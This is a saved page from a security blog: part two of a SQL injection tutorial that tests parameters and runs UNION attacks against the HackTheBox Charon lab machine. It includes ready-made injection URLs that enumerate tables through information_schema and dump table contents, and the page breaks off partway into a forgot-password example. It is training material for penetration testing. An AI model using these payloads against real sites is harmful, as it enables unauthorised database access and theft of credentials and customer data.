@@ -1,0 +1,1208 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SQL Injection 0x02 - Testing and UNION Attacks - Welcome to noobsec</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="SQL Injection 0x02 - Testing and UNION Attacks" />
+<meta property="og:description" content="SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it here.
+In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/sqli-0x02/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2020-07-10T22:31:47+00:00" />
+<meta property="article:modified_time" content="2020-07-10T22:31:47+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SQL Injection 0x02 - Testing and UNION Attacks"/>
+<meta name="twitter:description" content="SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it here.
+In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot."/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#vulnerability-identification">Vulnerability Identification</a></li>
+    <li><a href="#vulnerability-testing">Vulnerability Testing</a>
+      <ul>
+        <li><a href="#example-1---blog">Example 1 - Blog</a></li>
+      </ul>
+    </li>
+    <li><a href="#vulnerability-exploitaion---union-attacks---example-1">Vulnerability Exploitaion - UNION Attacks - Example 1</a>
+      <ul>
+        <li><a href="#backend-query">Backend Query</a></li>
+        <li><a href="#number-of-columns">Number of Columns</a></li>
+        <li><a href="#enumerating-database">Enumerating Database</a></li>
+        <li><a href="#enumerating-tables">Enumerating Tables</a></li>
+        <li><a href="#enumerating-columns">Enumerating Columns</a></li>
+        <li><a href="#getting-contents">Getting Contents</a></li>
+      </ul>
+    </li>
+    <li><a href="#example-2---forgot-password">Example 2 - Forgot Password</a>
+      <ul>
+        <li><a href="#vulnerability-testing-1">Vulnerability Testing</a></li>
+        <li><a href="#vulnerability-exploitation---union-attacks">Vulnerability Exploitation - UNION Attacks</a></li>
+        <li><a href="#enumerating-database-1">Enumerating Database</a></li>
+        <li><a href="#enumerating-tables-1">Enumerating Tables</a></li>
+        <li><a href="#enumerating-columns-1">Enumerating Columns</a></li>
+        <li><a href="#getting-content">Getting Content</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#fin">Fin</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="sql-injection-0x02---testing-and-union-attacks">SQL Injection 0x02 - Testing and UNION Attacks</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it <a href="/sqli-0x01">here</a>.</p>
+<p>In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot.</p>
+<p>The post contains two classic UNION injection examples from identification to exploitation of the same. Both the examples are separated into their own parts to ensure that a reader of any experience can follow along. At the end of the post I&rsquo;ve put up a small table of new things I&rsquo;ve introduced in this post and what they are. I&rsquo;ve also put up a checklist of steps that you should perform when testing a parameter and when exploiting UNION-based SQL injections.</p>
+<h2 id="vulnerability-identification">Vulnerability Identification</h2>
+<p>To be able to identify all the potential SQL injection points, it&rsquo;s essential that the application and its functionality is browsed through and understood (as much as possible), making note of all the pages and functions that might be interacting with the database, usually PHP, ASPX, or such pages. Some of the example of where an application might be interacting with the database would be:</p>
+<ul>
+<li>authentication forms
+<ul>
+<li>login</li>
+<li>password reset</li>
+</ul>
+</li>
+<li>e-commerce platforms
+<ul>
+<li>product display</li>
+</ul>
+</li>
+<li>search engine portal</li>
+</ul>
+<p>Make note of all the user input fields and parameters being passed in requests. These would be the testing points for SQL injection.</p>
+<h2 id="vulnerability-testing">Vulnerability Testing</h2>
+<p>Once all the user input fields and parameters have been identified, each field and parameter needs to be tested individually. This is to ensure that only one object is affecting the backend and will make testing for effective. Along with these, HTTP headers like User-Agent and Cookie should also be on your list to test for. User-Agent and/or cookies might be getting tracked and written onto a table for analytics purposes or tracking users.</p>
+<p>Best way to test is to use something a SQL database would treat it as a part of the query itself.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">'       # a single quote, treated as a string terminator
+;       # a semi-colon, treated as a query terminator
+#       # a comment, comments out anything that comes after that character in that line
+-- -    # a comment, same as above
+/**/    # a comment, starts with /* , ends with */ , and can contain anything in between 
+AND 1=1 # an and statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
+OR 1=1  # an or statement, 1=1 tests for true condition, use 1=2 to test for false condition
+sleep(5)# delays the response by the number of seconds mentioned in the sleep command. 
+</code></pre>
+<p>The objective of these tests is for the existing query to return true, false or some kinda subtle changes to the webpage or bring out the errors.</p>
+<h3 id="example-1---blog">Example 1 - Blog</h3>
+<p>All examples here are from <a href="https://www.hackthebox.eu/home/machines/profile/42">HackTheBox - Charon</a> machine.</p>
+<p>Normal looking blog post</p>
+<p><img src="/sqli-0x02/1_normal.png" alt="Normal Post"></p>
+<ol>
+<li>Single-quote - <code>'</code>
+Add a single quote at the end of the parameter or in an input field.
+Eg: <a href="http://example.com/blog.php?id=11'">http://example.com/blog.php?id=11'</a></li>
+</ol>
+<p><img src="/sqli-0x02/2_single_quote.png" alt="Single Quote Test"></p>
+<p>The post broke due to the semi colon, indicating that the parameter id could potentially be vulnerable to SQL injection</p>
+<ol start="2">
+<li>Semi-colon - <code>;</code>
+Add a semi-colon at the end of a parameter or in an input field
+Eg: <a href="http://example.com/blog.php?id=11;">http://example.com/blog.php?id=11;</a></li>
+</ol>
+<p><img src="/sqli-0x02/3_semi_colon.png" alt="Semi Colon Test"></p>
+<p>This indicates that even though the query may be getting terminated, the query is working just as intended.</p>
+<ol start="3">
+<li>Comments - <code>-- -</code>
+Comments passed onto the parameter or the input field needs to be database specific. MySQL uses the above mentioned comments.
+Eg: <a href="http://example.com/blog.php?id=11--%20-">http://example.com/blog.php?id=11--%20-</a></li>
+</ol>
+<p><img src="/sqli-0x02/4_comments.png" alt="Comment Test"></p>
+<p>Even after commenting out the rest of the query, it is working as intended.</p>
+<ol start="4">
+<li>And operator - <code>AND</code>
+AND operator should be passed with some additional condition in parameters or input fields.</li>
+</ol>
+<p><img src="/sqli-0x02/5_and.png" alt="AND Operator Test"></p>
+<p>This means we can probably append any SQL statement to the <code>id</code> parameter. Since a post with id=11 exists and 1=1, it comes out to be true and the post loads. If the same is tried with some random <code>id</code> value, while 1=1, the post will not load.</p>
+<ol start="5">
+<li>OR operator - <code>OR</code>
+<code>OR</code> operator should be passed with some additional condition in parameters or input fields.</li>
+</ol>
+<p><img src="/sqli-0x02/6_or.png" alt="OR Operator Test"></p>
+<p>Unlike <code>AND</code>, whatever value you put in either the <code>id</code> field or the condition after <code>OR</code>, as long as one of them is <code>true</code> the requested blog post or the first post in the blog will load.</p>
+<ol start="6">
+<li>Sleep - <code>sleep(seconds)</code>
+When output doesn&rsquo;t show that something is vulnerable to the SQL injection, doesn&rsquo;t mean that it&rsquo;s not. It could be blind.
+At times like those a <code>sleep</code> statement could be passed like <code>id=11 AND sleep(20)</code> and look at the amount of time it takes to send the response back, if it&rsquo;s anywhere from 18-22 seconds, you have a SQL injection on your hand.</li>
+</ol>
+<p>Let&rsquo;s see how long a normal request take</p>
+<p><img src="/sqli-0x02/7_sleep_1.png" alt="cURL Request"></p>
+<p><img src="/sqli-0x02/7_sleep_2.png" alt="Time Taken Normally"></p>
+<p>Let&rsquo;s see how long a request with a sleep command of 20 seconds take</p>
+<p><img src="/sqli-0x02/7_sleep_3.png" alt="cURL Request With Sleep"></p>
+<p><img src="/sqli-0x02/7_sleep_4.png" alt="Sleep Injection Successful"></p>
+<p>Even with the sleep command we could successfully test that this parameter is vulnerable. Sleep command requires to be used with an operator or a <code>SELECT</code> statement, it cannot be used as-is.</p>
+<h2 id="vulnerability-exploitaion---union-attacks---example-1">Vulnerability Exploitaion - UNION Attacks - Example 1</h2>
+<p>Once an SQL injection has been identified and tested, it is time to exploit it. An SQL injection exploitation is usually used in order to find something juicy - credentials, customer details, credit card numbers.</p>
+<p>This post, as mentioned above, will cover UNION injections. Let&rsquo;s continue with the above example.</p>
+<h3 id="backend-query">Backend Query</h3>
+<p>We&rsquo;ve successfully found that the <code>id</code> parameter is vulnerable to SQL injection. The way the code might be working at the backend would be that the PHP takes the id parameter from a GET request and then passes it to some internal variable, which puts it into a SQL query.
+If we had to guess the query it is executing it could be something like below:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT title, author, date, post FROM blogpost WHERE id=11
+</code></pre>
+<p>With this guess we can estimate that this particular table has 5 columns. Let&rsquo;s test it out.</p>
+<h3 id="number-of-columns">Number of Columns</h3>
+<p>We&rsquo;ll send a set of <code>UNION</code> requests to identify number of columns like follows:</p>
+<pre  class="mc-prism hide language-text" ><code>http://10.10.10.31/singlepost.php?id=11 UNION SELECT 1-- -
+</code></pre>
+<p><img src="/sqli-0x02/7_union_1.png" alt="UNION Testing"></p>
+<p>We can rule out that the table does not have just 1 column, and repeat the process by adding another number.</p>
+<p><img src="/sqli-0x02/8_union_done.png" alt="UNION Worked"></p>
+<p>After few iterations we found that the table indeed has 5 columns, our estimation was correct.</p>
+<p>The above request would&rsquo;ve generated a query as follows:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,5-- -
+</code></pre>
+<p>The reason the first UNION query (sent with only 1 column) did not work is because, a UNION of two tables has to have <em>equal</em> number of columns for it to be considered as a working query.</p>
+<p>We can send in anything in the <code>SELECT</code> part of the <code>UNION</code> query since it is not taking anything from a table. We used numbers but you can also send in alphabets; if you do go for alphabets, do not forget to add quotes.</p>
+<p>We do not know which column number (from our UNION) is going to which part of the blog post - title, author, date, post.
+To do that we can ask the webpage to load a non-existent post (a random <code>id</code>), which would result as <code>false</code> thus not loading anything, while our <code>UNION</code> is present. This will lead to our injected query getting printed out.</p>
+<p><img src="/sqli-0x02/8_union_ok.png" alt="Column Position Found"></p>
+<p><em>Note</em>: The number of columns printed out on the screen isn&rsquo;t necessary to be matched by the UNION query, but the number of columns the table actually has. You can see here that only four things are getting printed on here, &ldquo;1&rdquo; isn&rsquo;t getting printed out at all.</p>
+<p>We can see that fifth column printed out first as title of the post, third and second column as author and date respectively in tiny font, and then the fourth column which has quite some space to put text in as it is used for the post of the blog.</p>
+<p>Now that we have column position on hand, we can start dumping data out on the screen.</p>
+<h3 id="enumerating-database">Enumerating Database</h3>
+<p>Let&rsquo;s look at the version of the MySQL database. We can use MySQL internal functions at our advantage here.</p>
+<p><img src="/sqli-0x02/11_version.png" alt="DB Version"></p>
+<p>Let&rsquo;s check out the name of the database we&rsquo;re using. In database systems, you can use multiple databases (within a single database management system like MySQL) under different user contexts.</p>
+<p><img src="/sqli-0x02/12_blog_union_database.png" alt="Database Found"></p>
+<p>We are using a database called &ldquo;freeeze&rdquo;</p>
+<p>Let&rsquo;s take a look at the user we are running as.</p>
+<p><img src="/sqli-0x02/13_blog_union_user.png" alt="User Found"></p>
+<p>We are running as &ldquo;freeeze@localhost&rdquo;. Not so useful, let&rsquo;s move on.</p>
+<h3 id="enumerating-tables">Enumerating Tables</h3>
+<p>Now we want to know what tables exist in the database we are using.</p>
+<p>In SQL we can list down tables and columns that exist in the database. In MySQL, there are a set of tables called as <em><strong>information_schema</strong></em> tables which holds all the &ldquo;metadata&rdquo; or useful information for the database to function properly.</p>
+<p>The most commonly used tables of <em><strong>information_schema</strong></em> set are:</p>
+<ol>
+<li><em>information_schema.tables</em> - A table containing information about all the tables in the database</li>
+<li><em>information_schema.columns</em> - A table containing information about all the columns of all the tables in the database</li>
+</ol>
+<p>Now that we know that, let&rsquo;s use this information to get information about the tables that are present in our database, &ldquo;freeeze&rdquo;.</p>
+<p>To do so, we&rsquo;ll essentially send in a query as follows:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL"># Complete query in the backend
+SELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -
+
+# Our malicious query (post UNION)
+SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -
+</code></pre>
+<p>This will <code>SELECT</code> (print out) all the tables <code>FROM</code> the table called <em>information_schema.tables</em> <code>WHERE</code> those tables are in the current <code>database()</code>. This of course still need to work along with the existing query and we are assuming that we only have one row to print our output on.</p>
+<p>On the above query I&rsquo;m using a function called <code>GROUP_CONCAT()</code>. This function not only concatenates the entire output, it also places it in a single row. You can use this function wherever there is a <code>LIMIT</code> on the backend and are restricted to print out multiple rows of output.</p>
+<p>In the form of request it will look like below</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c)+FROM+information_schema.tables+WHERE+table_schema=database()--+-
+</code></pre>
+<p>With group concat, you can pass in hex characters or even additional ascii to provide your results more distinction and even aesthetics.</p>
+<p>Output of the above request</p>
+<p><img src="/sqli-0x02/15_blog_union_current_db_table.png" alt="Table Found"></p>
+<p>Apparently this particular database only has one table, although we can guess that it&rsquo;s not of any use let&rsquo;s take a look at it anyway.</p>
+<h3 id="enumerating-columns">Enumerating Columns</h3>
+<p>We leverage the use of <em>information_schema.columns</em> table to get all the columns from the table <em>blog</em> we found earlier.</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7c),5+FROM+information_schema.columns+WHERE+table_name='blog'--+-
+</code></pre>
+<p><img src="/sqli-0x02/16_columns_blog.png" alt="Columns Found"></p>
+<h3 id="getting-contents">Getting Contents</h3>
+<p>Before printing out everything, let&rsquo;s find out the number of rows present in the table. On the website, it showed only 3 posts, it could be a possibility that there are hidden posts present here.</p>
+<p>Let&rsquo;s take a count of <code>id</code> column as that column has to be present in a table.</p>
+<p>Request sent:</p>
+<pre  class="mc-prism hide language-text" ><code>http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,count(id)+FROM+blog--+-
+</code></pre>
+<p><img src="/sqli-0x02/17_row_count.png" alt="Number Of Rows"></p>
+<p>Unfortunately there are only 3 posts present and there is no hidden content available here. Regardless of that, let&rsquo;s print those out.</p>
+<p>Printing out id and it&rsquo;s respective texts out on the screen.</p>
+<p>Request:</p>
+<pre  class="mc-prism hide language-text" ><code>http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(%27\r\n%27,0x7c,id,0x7c,%27\r\n%27,text),5+FROM+blog--+-
+</code></pre>
+<p><img src="/sqli-0x02/18_blog_dump.png" alt="Blog Dump"></p>
+<p>This request will form a query like below:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT title, author, date, text FROM blog WHERE id=191 UNION SELECT 1,2,3,group_concat('\r\n',0x7c,id,0x7c,'\r\n',text),5 FROM blog--+-
+</code></pre>
+<p>Unlike before I used the fourth column to print all the entries out at once because printing it out in any other column would not provide much space to fit all that text.</p>
+<h2 id="example-2---forgot-password">Example 2 - Forgot Password</h2>
+<p>In order to avoid breaking the flow of the previous example, I decided to put the second example at the end in which I&rsquo;ll cover testing as well as exploitation.</p>
+<p>Unlike the previous example where it was quite obvious that the parameter was vulnerable and was using GET requests, let&rsquo;s take a look at a forgot password functonality which uses a POST request and has some minor filtering in place.</p>
+<p>Before moving onto testing a certain functionality it&rsquo;s important to understand that functionality. Let&rsquo;s take a look at how this particular input field can be interacted.</p>
+<p>Landing page:</p>
+<p><img src="/sqli-0x02/19_password_reset.png" alt="Password Reset"></p>
+<p>By just sending &ldquo;admin&rdquo;, it prints out an error &ldquo;Incorrect Format&rdquo;. This is good, getting errors is nice. When special SQL characters are sent with just &ldquo;admin&rdquo; leads to the same error.</p>
+<p><img src="/sqli-0x02/20_format.png" alt="Incorrect Format"></p>
